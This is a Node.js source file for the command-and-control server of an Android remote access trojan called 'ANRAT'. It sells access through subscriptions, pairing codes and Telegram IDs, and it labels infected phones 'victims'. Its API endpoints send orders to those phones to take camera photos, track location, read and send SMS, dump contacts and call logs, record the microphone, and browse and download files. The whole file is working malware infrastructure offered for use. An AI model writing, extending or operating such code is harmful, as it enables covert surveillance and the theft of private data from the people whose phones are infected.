require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const mysql = require('mysql2/promise');
const io = require('socket.io');
const geoip = require('geoip-lite');

const app = express();
const API_PORT = process.env.API_PORT || 3000;
const RAT_PORT = process.env.RAT_PORT || 42474;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Database Pool
const db = mysql.createPool({
  host: process.env.DB_HOST || 'localhost',
  user: process.env.DB_USER || 'root',
  password: process.env.DB_PASSWORD || '',
  database: process.env.DB_NAME || 'anrat',
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0
});

// In-memory victims storage
const victims = {};
let ratServer = null;

// ========================================
// DATABASE HELPER FUNCTIONS
// ========================================

async function getPairingCode(code) {
  try {
    const [rows] = await db.execute(
      `SELECT pc.*, s.type, s.users, s.telegram_id
       FROM pairing_codes pc 
       JOIN subscriptions s ON pc.subscription_id = s.id 
       WHERE pc.pairing_code = ? 
       AND pc.used = 0 
       AND pc.expires_at > NOW()`,
      [code]
    );
    return rows[0] || null;
  } catch (error) {
    console.error('Error getting pairing code:', error);
    return null;
  }
}

async function usePairingCode(code, deviceId) {
  try {
    const [result] = await db.execute(
      'UPDATE pairing_codes SET used = 1, used_at = NOW(), device_id = ? WHERE pairing_code = ?',
      [deviceId, code]
    );
    return result.affectedRows > 0;
  } catch (error) {
    console.error('Error using pairing code:', error);
    return false;
  }
}

async function addDevice(subscriptionId, telegramId, deviceId, deviceName) {
  try {
    // Check if device already exists
    const [existing] = await db.execute(
      'SELECT * FROM devices WHERE device_id = ?',
      [deviceId]
    );

    if (existing.length > 0) {
      // Update existing device
      await db.execute(
        'UPDATE devices SET last_active = NOW(), status = "active" WHERE device_id = ?',
        [deviceId]
      );
      return existing[0].id;
    } else {
      // Insert new device
      const [result] = await db.execute(
        'INSERT INTO devices (subscription_id, telegram_id, device_id, device_name, last_active) VALUES (?, ?, ?, ?, NOW())',
        [subscriptionId, telegramId, deviceId, deviceName]
      );
      return result.insertId;
    }
  } catch (error) {
    console.error('Error adding device:', error);
    return null;
  }
}

async function getDevice(deviceId) {
  try {
    const [rows] = await db.execute(
      `SELECT d.*, s.type, s.users, u.username, u.telegram_id as owner_telegram_id
       FROM devices d 
       JOIN subscriptions s ON d.subscription_id = s.id 
       JOIN users u ON d.telegram_id = u.telegram_id 
       WHERE d.device_id = ? AND d.status = 'active'`,
      [deviceId]
    );
    return rows[0] || null;
  } catch (error) {
    console.error('Error getting device:', error);
    return null;
  }
}

async function getDevicesByTelegramId(telegramId) {
  try {
    const [rows] = await db.execute(
      `SELECT d.*, s.type 
       FROM devices d 
       JOIN subscriptions s ON d.subscription_id = s.id 
       WHERE d.telegram_id = ? 
       AND d.status = 'active' 
       ORDER BY d.last_active DESC`,
      [telegramId]
    );
    return rows;
  } catch (error) {
    console.error('Error getting devices:', error);
    return [];
  }
}

async function updateDeviceLastActive(deviceId) {
  try {
    await db.execute(
      'UPDATE devices SET last_active = NOW() WHERE device_id = ?',
      [deviceId]
    );
    return true;
  } catch (error) {
    console.error('Error updating device:', error);
    return false;
  }
}

async function verifyDeviceOwnership(deviceId, telegramId) {
  try {
    const [rows] = await db.execute(
      'SELECT * FROM devices WHERE device_id = ? AND telegram_id = ? AND status = "active"',
      [deviceId, telegramId]
    );
    return rows.length > 0;
  } catch (error) {
    console.error('Error verifying ownership:', error);
    return false;
  }
}

// ========================================
// SOCKET.IO RAT SERVER
// ========================================

function startRATServer(port = RAT_PORT) {
  if (ratServer) {
    console.log('⚠️  RAT Server already running');
    return false;
  }

  try {
    ratServer = io.listen(port, {
      maxHttpBufferSize: 1024 * 1024 * 100,
      cors: {
        origin: "*",
        methods: ["GET", "POST"]
      }
    });

    ratServer.sockets.pingInterval = 10000;
    ratServer.sockets.pingTimeout = 10000;

    ratServer.sockets.on('connection', async (socket) => {
      const address = socket.request.connection;
      const query = socket.handshake.query;
      
      // Extract device info
      const deviceId = query.id;
      const pairingCode = query.pairing_code;
      const ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
      
      let country = null;
      const geo = geoip.lookup(ip);
      if (geo) country = geo.country.toLowerCase();

      console.log(`\n🔌 New connection attempt:`);
      console.log(`   Device ID: ${deviceId}`);
      console.log(`   Pairing Code: ${pairingCode}`);
      console.log(`   IP: ${ip}`);

      // Verify pairing code
      if (!pairingCode) {
        console.log('   ❌ No pairing code provided');
        socket.emit('error', { message: 'Pairing code required' });
        socket.disconnect();
        return;
      }

      const pairingData = await getPairingCode(pairingCode);
      
      if (!pairingData) {
        console.log('   ❌ Invalid or expired pairing code');
        socket.emit('error', { message: 'Invalid or expired pairing code' });
        socket.disconnect();
        return;
      }

      console.log(`   ✅ Valid pairing code for user: ${pairingData.telegram_id}`);

      // Check device limit
      const existingDevices = await getDevicesByTelegramId(pairingData.telegram_id);
      const maxDevices = pairingData.users === 0 ? Infinity : parseInt(pairingData.users);
      
      if (existingDevices.length >= maxDevices) {
        console.log(`   ❌ Device limit reached: ${existingDevices.length}/${maxDevices}`);
        socket.emit('error', { message: 'Device limit reached' });
        socket.disconnect();
        return;
      }

      // Use pairing code and add device
      await usePairingCode(pairingCode, deviceId);
      const deviceName = `${query.manf} ${query.model}`;
      await addDevice(pairingData.subscription_id, pairingData.telegram_id, deviceId, deviceName);

      console.log(`   ✅ Device paired successfully!`);

      // Store victim data
      victims[deviceId] = {
        socket: socket,
        deviceId: deviceId,
        ip: ip,
        port: address.remotePort,
        country: country,
        manufacturer: query.manf,
        model: query.model,
        release: query.release,
        telegramId: pairingData.telegram_id,
        subscriptionId: pairingData.subscription_id,
        connectedAt: new Date()
      };

      // Update last active
      await updateDeviceLastActive(deviceId);

      // Emit success
      socket.emit('paired', { 
        success: true, 
        message: 'Device paired successfully',
        deviceId: deviceId 
      });

      // Handle disconnect
      socket.on('disconnect', async () => {
        console.log(`\n🔌 Device disconnected: ${deviceId}`);
        delete victims[deviceId];
      });

      // Handle commands
      socket.on('order', (data) => {
        console.log(`📨 Order received from ${deviceId}:`, data.order);
      });
    });

    console.log(`✅ RAT Server started on port ${port}`);
    return true;
  } catch (error) {
    console.error('❌ Failed to start RAT server:', error);
    return false;
  }
}

function stopRATServer() {
  if (!ratServer) {
    return false;
  }

  try {
    ratServer.close();
    ratServer = null;
    
    // Clear victims
    Object.keys(victims).forEach(key => delete victims[key]);
    
    console.log('✅ RAT Server stopped');
    return true;
  } catch (error) {
    console.error('❌ Failed to stop RAT server:', error);
    return false;
  }
}

// ========================================
// REST API ENDPOINTS
// ========================================

// Health check
app.get('/api/health', (req, res) => {
  res.json({ 
    success: true, 
    status: 'running', 
    version: '1.0.0',
    ratServer: ratServer !== null,
    connectedDevices: Object.keys(victims).length
  });
});

// Get all victims (filtered by telegram_id)
app.get('/api/victims', async (req, res) => {
  try {
    const { telegram_id } = req.query;
    
    if (!telegram_id) {
      return res.status(400).json({ 
        success: false, 
        error: 'telegram_id required' 
      });
    }

    // Get user's paired devices
    const devices = await getDevicesByTelegramId(telegram_id);
    const deviceIds = devices.map(d => d.device_id);

    // Filter connected victims
    const userVictims = Object.values(victims)
      .filter(v => deviceIds.includes(v.deviceId))
      .map(v => ({
        deviceId: v.deviceId,
        ip: v.ip,
        port: v.port,
        country: v.country,
        manufacturer: v.manufacturer,
        model: v.model,
        release: v.release,
        connectedAt: v.connectedAt
      }));

    res.json({ 
      success: true, 
      victims: userVictims,
      total: userVictims.length
    });
  } catch (error) {
    console.error('Error getting victims:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get specific victim
app.get('/api/victims/:deviceId', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { telegram_id } = req.query;

    if (!telegram_id) {
      return res.status(400).json({ 
        success: false, 
        error: 'telegram_id required' 
      });
    }

    // Verify ownership
    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
    if (!isOwner) {
      return res.status(403).json({ 
        success: false, 
        error: 'Access denied' 
      });
    }

    const victim = victims[deviceId];
    
    if (!victim) {
      return res.status(404).json({ 
        success: false, 
        error: 'Device not connected' 
      });
    }

    res.json({ 
      success: true, 
      victim: {
        deviceId: victim.deviceId,
        ip: victim.ip,
        port: victim.port,
        country: victim.country,
        manufacturer: victim.manufacturer,
        model: victim.model,
        release: victim.release,
        connectedAt: victim.connectedAt
      }
    });
  } catch (error) {
    console.error('Error getting victim:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Send command to victim
app.post('/api/victims/:deviceId/command', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { telegram_id, order, extra, data } = req.body;

    if (!telegram_id) {
      return res.status(400).json({ 
        success: false, 
        error: 'telegram_id required' 
      });
    }

    // Verify ownership
    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
    if (!isOwner) {
      return res.status(403).json({ 
        success: false, 
        error: 'Access denied' 
      });
    }

    const victim = victims[deviceId];
    
    if (!victim) {
      return res.status(404).json({ 
        success: false, 
        error: 'Device not connected' 
      });
    }

    if (!order) {
      return res.status(400).json({ 
        success: false, 
        error: 'Order is required' 
      });
    }

    // Send command
    victim.socket.emit('order', { order, extra, ...data });
    
    // Update last active
    await updateDeviceLastActive(deviceId);

    res.json({ success: true, message: 'Command sent successfully' });
  } catch (error) {
    console.error('Error sending command:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Camera endpoints
app.post('/api/victims/:deviceId/camera', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { telegram_id, cameraId = 0 } = req.body;

    if (!telegram_id) {
      return res.status(400).json({ success: false, error: 'telegram_id required' });
    }

    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
    if (!isOwner) {
      return res.status(403).json({ success: false, error: 'Access denied' });
    }

    const victim = victims[deviceId];
    if (!victim) {
      return res.status(404).json({ success: false, error: 'Device not connected' });
    }

    // Request camera list first
    victim.socket.emit('order', { order: 'x0000ca', extra: 'camList' });
    
    // Wait a bit then take photo
    setTimeout(() => {
      victim.socket.emit('order', { order: 'x0000ca', extra: cameraId });
    }, 1000);

    await updateDeviceLastActive(deviceId);

    res.json({ success: true, message: 'Camera capture initiated' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Location endpoint
app.post('/api/victims/:deviceId/location', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { telegram_id } = req.body;

    if (!telegram_id) {
      return res.status(400).json({ success: false, error: 'telegram_id required' });
    }

    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
    if (!isOwner) {
      return res.status(403).json({ success: false, error: 'Access denied' });
    }

    const victim = victims[deviceId];
    if (!victim) {
      return res.status(404).json({ success: false, error: 'Device not connected' });
    }

    victim.socket.emit('order', { order: 'x0000lm' });
    await updateDeviceLastActive(deviceId);

    res.json({ success: true, message: 'Location request sent' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// SMS endpoints
app.post('/api/victims/:deviceId/sms/list', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { telegram_id } = req.body;

    if (!telegram_id) {
      return res.status(400).json({ success: false, error: 'telegram_id required' });
    }

    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
    if (!isOwner) {
      return res.status(403).json({ success: false, error: 'Access denied' });
    }

    const victim = victims[deviceId];
    if (!victim) {
      return res.status(404).json({ success: false, error: 'Device not connected' });
    }

    victim.socket.emit('order', { order: 'x0000sm', extra: 'ls' });
    await updateDeviceLastActive(deviceId);

    res.json({ success: true, message: 'SMS list request sent' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/victims/:deviceId/sms/send', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { telegram_id, to, message } = req.body;

    if (!telegram_id) {
      return res.status(400).json({ success: false, error: 'telegram_id required' });
    }

    if (!to || !message) {
      return res.status(400).json({ success: false, error: 'Phone number and message are required' });
    }

    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
    if (!isOwner) {
      return res.status(403).json({ success: false, error: 'Access denied' });
    }

    const victim = victims[deviceId];
    if (!victim) {
      return res.status(404).json({ success: false, error: 'Device not connected' });
    }

    victim.socket.emit('order', { 
      order: 'x0000sm', 
      extra: 'sendSMS', 
      to: to, 
      sms: message 
    });
    
    await updateDeviceLastActive(deviceId);

    res.json({ success: true, message: 'SMS sent successfully' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Contacts endpoint
app.post('/api/victims/:deviceId/contacts', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { telegram_id } = req.body;

    if (!telegram_id) {
      return res.status(400).json({ success: false, error: 'telegram_id required' });
    }

    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
    if (!isOwner) {
      return res.status(403).json({ success: false, error: 'Access denied' });
    }

    const victim = victims[deviceId];
    if (!victim) {
      return res.status(404).json({ success: false, error: 'Device not connected' });
    }

    victim.socket.emit('order', { order: 'x0000cn' });
    await updateDeviceLastActive(deviceId);

    res.json({ success: true, message: 'Contacts request sent' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Call logs endpoint
app.post('/api/victims/:deviceId/calls', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { telegram_id } = req.body;

    if (!telegram_id) {
      return res.status(400).json({ success: false, error: 'telegram_id required' });
    }

    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
    if (!isOwner) {
      return res.status(403).json({ success: false, error: 'Access denied' });
    }

    const victim = victims[deviceId];
    if (!victim) {
      return res.status(404).json({ success: false, error: 'Device not connected' });
    }

    victim.socket.emit('order', { order: 'x0000cl' });
    await updateDeviceLastActive(deviceId);

    res.json({ success: true, message: 'Call logs request sent' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Microphone endpoint
app.post('/api/victims/:deviceId/microphone', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { telegram_id, duration = 10 } = req.body;

    if (!telegram_id) {
      return res.status(400).json({ success: false, error: 'telegram_id required' });
    }

    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
    if (!isOwner) {
      return res.status(403).json({ success: false, error: 'Access denied' });
    }

    const victim = victims[deviceId];
    if (!victim) {
      return res.status(404).json({ success: false, error: 'Device not connected' });
    }

    victim.socket.emit('order', { order: 'x0000mc', sec: duration });
    await updateDeviceLastActive(deviceId);

    res.json({ success: true, message: 'Microphone recording initiated' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// File manager endpoints
app.post('/api/victims/:deviceId/files/list', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { telegram_id, path = '/storage/emulated/0/' } = req.body;

    if (!telegram_id) {
      return res.status(400).json({ success: false, error: 'telegram_id required' });
    }

    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
    if (!isOwner) {
      return res.status(403).json({ success: false, error: 'Access denied' });
    }

    const victim = victims[deviceId];
    if (!victim) {
      return res.status(404).json({ success: false, error: 'Device not connected' });
    }

    victim.socket.emit('order', { 
      order: 'x0000fm', 
      extra: 'ls', 
      path: path 
    });
    
    await updateDeviceLastActive(deviceId);

    res.json({ success: true, message: 'File list request sent' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/victims/:deviceId/files/download', async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { telegram_id, path } = req.body;

    if (!telegram_id) {
      return res.status(400).json({ success: false, error: 'telegram_id required' });
    }

    if (!path) {
      return res.status(400).json({ success: false, error: 'File path is required' });
    }

    const isOwner = await verifyDeviceOwnership(deviceId, telegram_id);
    if (!isOwner) {
      return res.status(403).json({ success: false, error: 'Access denied' });
    }

    const victim = victims[deviceId];
    if (!victim) {
      return res.status(404).json({ success: false, error: 'Device not connected' });
    }

    victim.socket.emit('order', { 
      order: 'x0000fm', 
      extra: 'dl', 
      path: path 
    });
    
    await updateDeviceLastActive(deviceId);

    res.json({ success: true, message: 'File download initiated' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Server control endpoints
app.post('/api/server/start', (req, res) => {
  const { port = RAT_PORT } = req.body;
  
  const success = startRATServer(port);
  
  if (success) {
    res.json({ success: true, message: `Server started on port ${port}` });
  } else {
    res.json({ success: false, error: 'Server already running or failed to start' });
  }
});

app.post('/api/server/stop', (req, res) => {
  const success = stopRATServer();
  
  if (success) {
    res.json({ success: true, message: 'Server stopped' });
  } else {
    res.json({ success: false, error: 'Server not running or failed to stop' });
  }
});

// ========================================
// START SERVER
// ========================================

db.getConnection()
  .then(connection => {
    console.log('✅ Database connected successfully!');
    connection.release();
    
    // Start API server
    app.listen(API_PORT, () => {
      console.log(`\n🚀 ANRAT API Server running on port ${API_PORT}`);
      console.log(`📡 API Base URL: http://localhost:${API_PORT}/api`);
      console.log(`\n📚 Available endpoints:`);
      console.log(`   GET  /api/health`);
      console.log(`   GET  /api/victims?telegram_id=xxx`);
      console.log(`   GET  /api/victims/:deviceId?telegram_id=xxx`);
      console.log(`   POST /api/victims/:deviceId/command`);
      console.log(`   POST /api/victims/:deviceId/camera`);
      console.log(`   POST /api/victims/:deviceId/location`);
      console.log(`   POST /api/victims/:deviceId/sms/list`);
      console.log(`   POST /api/victims/:deviceId/sms/send`);
      console.log(`   POST /api/victims/:deviceId/contacts`);
      console.log(`   POST /api/victims/:deviceId/calls`);
      console.log(`   POST /api/victims/:deviceId/microphone`);
      console.log(`   POST /api/victims/:deviceId/files/list`);
      console.log(`   POST /api/victims/:deviceId/files/download`);
      console.log(`   POST /api/server/start`);
      console.log(`   POST /api/server/stop`);
    });
    
    // Auto-start RAT server
    startRATServer(RAT_PORT);
    
  })
  .catch(error => {
    console.error('❌ Database connection failed:', error);
    process.exit(1);
  });

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('\n⏹️  Shutting down gracefully...');
  stopRATServer();
  db.end();
  process.exit(0);
});